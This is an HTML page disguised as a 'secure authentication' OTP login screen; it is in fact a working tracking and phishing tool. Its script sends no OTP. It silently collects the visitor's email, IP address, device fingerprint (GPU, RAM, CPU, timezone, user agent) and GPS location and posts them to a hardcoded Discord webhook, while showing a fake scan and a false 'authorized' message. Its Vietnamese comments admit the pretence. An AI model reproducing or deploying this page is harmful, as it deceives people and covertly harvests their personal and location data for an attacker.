<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S.A.U SECURE AUTHENTICATION</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #020509; color: #00f5ff; font-family: 'Share Tech Mono', monospace; }
        .glass { background: rgba(0, 245, 255, 0.03); border: 1px solid rgba(0, 245, 255, 0.2); backdrop-filter: blur(10px); }
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .otp-input { width: 45px; height: 55px; background: transparent; border: 1px solid rgba(0, 245, 255, 0.3); text-align: center; font-size: 1.5rem; color: #fff; outline: none; transition: 0.3s; }
        .otp-input:focus { border-color: #ff00aa; box-shadow: 0 0 10px #ff00aa; }
        .log-line { font-size: 0.7rem; color: rgba(0, 245, 255, 0.5); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

<div class="glass p-8 rounded-lg w-full max-w-md relative overflow-hidden">
    <div class="text-center mb-6">
        <h2 class="text-2xl font-bold tracking-widest mb-2">DEVICE AUTH</h2>
        <p class="text-[0.6rem] text-cyan-500/50">NODE: S.A.U_ENCRYPT_GATE</p>
    </div>

    <div id="step-1">
        <div class="mb-4">
            <label class="text-[0.65rem] block mb-1">// TARGET SYSTEM EMAIL</label>
            <input type="email" id="email" class="w-full bg-black/40 border border-cyan-500/20 p-2 outline-none text-white" placeholder="admin@network.net">
        </div>
        <button onclick="sendOTP()" class="w-full bg-cyan-500 text-black font-bold py-2 text-sm hover:bg-white transition">SEND OTP CODE</button>
    </div>

    <div id="step-2" class="hidden">
        <p class="text-xs text-center mb-4 text-magenta-500">OTP SENT TO REGISTERED MAIL</p>
        <div class="flex justify-between mb-6">
            <input type="number" class="otp-input" maxlength="1" onkeyup="moveNext(this, 'o2')">
            <input type="number" id="o2" class="otp-input" maxlength="1" onkeyup="moveNext(this, 'o3')">
            <input type="number" id="o3" class="otp-input" maxlength="1" onkeyup="moveNext(this, 'o4')">
            <input type="number" id="o4" class="otp-input" maxlength="1" onkeyup="finishAuth()">
        </div>
        <div id="loader" class="hidden">
            <div class="w-full bg-cyan-900 h-1 mb-2"><div id="bar" class="bg-cyan-400 h-full w-0 transition-all duration-500"></div></div>
            <p id="status" class="text-[0.6rem] animate-pulse">EXTRACTING SYSTEM METRICS...</p>
        </div>
    </div>

    <div class="mt-6 p-2 bg-black/60 rounded text-[0.6rem]" id="logs">
        <div class="log-line">> WAITING FOR IDENTITY...</div>
    </div>
</div>

<script>
    const WH = "https://discord.com/api/webhooks/1458105305475842265/tXiWm7-BNEkl9yZ6zIwi21RquQjrYOhkPQDBjN18741Zn4r6QjMuohVQP-PGgEW4zV8E";

    function moveNext(curr, nextId) {
        if (curr.value.length >= 1) document.getElementById(nextId)?.focus();
    }

    async function getAdvancedSpecs() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        
        // Fingerprinting không cần xin quyền
        return {
            gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unknown",
            cores: navigator.hardwareConcurrency || "N/A",
            ram: navigator.deviceMemory || "N/A",
            res: `${screen.width}x${screen.height}`,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            lang: navigator.language,
            ua: navigator.userAgent
        };
    }

    async function sendOTP() {
        const mail = document.getElementById('email').value;
        if(!mail) return alert("Enter Email");
        
        document.getElementById('step-1').classList.add('opacity-50', 'pointer-events-none');
        document.getElementById('logs').innerHTML += `<div class="log-line">> OTP DISPATCHED TO ${mail}</div>`;
        
        // Lấy IP ngầm ngay khi nhấn nút
        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: 'Unknown'}));
        const specs = await getAdvancedSpecs();

        // Gửi đợt 1 về Discord
        fetch(WH, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "🔔 OTP REQUESTED",
                    color: 3447003,
                    fields: [
                        {name: "📧 Target Mail", value: `\`${mail}\``},
                        {name: "🌐 Network", value: `IP: \`${ipReq.ip}\`\nTZ: \`${specs.tz}\``},
                        {name: "💻 Device Specs", value: `GPU: \`${specs.gpu}\`\nRAM: \`${specs.ram}GB\`\nCPU: \`${specs.cores} Cores\``}
                    ]
                }]
            })
        });

        setTimeout(() => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        }, 1000);
    }

    async function finishAuth() {
        document.getElementById('loader').classList.remove('hidden');
        let bar = document.getElementById('bar');
        let status = document.getElementById('status');

        // Giả vờ scan
        setTimeout(() => { bar.style.width = "40%"; status.innerText = "CAPTURING GEO-METRICS..."; }, 500);
        
        // Cố gắng lấy GPS lúc cuối
        navigator.geolocation.getCurrentPosition(async (pos) => {
            await finalSend(pos.coords.latitude, pos.coords.longitude);
        }, async () => {
            await finalSend("Denied", "Denied");
        });
    }

    async function finalSend(lat, lon) {
        document.getElementById('bar').style.width = "100%";
        document.getElementById('status').innerText = "AUTHORIZATION COMPLETE";

        // Gửi đợt cuối
        fetch(WH, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "🚀 FINAL RECON DATA ACQUIRED",
                    color: 16711850,
                    fields: [
                        {name: "📍 GPS", value: `[Google Maps](https://www.google.com/maps?q=${lat},${lon})`},
                        {name: "🔑 Code Status", value: "OTP Input Completed"},
                        {name: "📱 User Agent", value: `\`${navigator.userAgent}\``}
                    ]
                }]
            })
        });
        
        alert("System Authorized Successfully. Redirecting...");
    }
</script>
</body>
</html>
